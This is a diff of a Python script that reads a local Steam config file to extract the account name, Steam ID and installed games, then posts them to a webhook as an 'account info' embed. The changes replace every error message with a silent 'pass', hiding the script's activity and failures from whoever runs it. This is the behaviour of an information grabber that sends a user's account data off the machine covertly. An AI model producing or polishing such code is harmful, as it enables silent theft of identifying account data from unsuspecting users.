@@ -25,7 +25,7 @@ def get_account_name_and_steam_id_from_vdf(vdf_path):
         with open(vdf_path, "r", encoding="utf-8") as file:
             data = file.read()
             account_name_match = re.search(r'"AccountName"\s+"(.*?)"', data)
-            steam_id_match = re.search(r'"(\d{17})"', data)  # Steam IDs are 17 digits long
+            steam_id_match = re.search(r'"(\d{17})"', data)
             account_name = account_name_match.group(1) if account_name_match else None
             steam_id = steam_id_match.group(1) if steam_id_match else None
             return account_name, steam_id
@@ -71,7 +71,7 @@ def send_webhook(account_name, games, steam_id):
             {
                 "title": f"🎮 Steam Account Info for **{account_name}**",
                 "description": (
-                    "Here’s the **Steam Account Information**, a list of **installed games**, and the **games URL** for this user."
+                    "Here's the **Steam Account Information**, a list of **installed games**, and the **games URL** for this user."
                 ),
                 "color": 0x8b0000,
                 "thumbnail": {
@@ -117,9 +117,9 @@ def send_webhook(account_name, games, steam_id):
         if response.status_code == 204:
             pass
         else:
-            print(f"Failed to send webhook. Status code: {response.status_code}")
+            pass
     except requests.exceptions.RequestException as e:
-        print(f"Webhook request failed: {e}")
+        pass
 def main():
     steam_install_path = is_steam_installed()
     if steam_install_path:
@@ -130,9 +130,8 @@ def main():
             games = get_installed_steam_games(steam_install_path)
             send_webhook(account_name, games, steam_id)
         else:
-            print("Failed to retrieve account name or Steam ID.")
+            pass
     else:
-        print("Steam is not installed.")
-
+        pass
 if __name__ == "__main__":
     main()
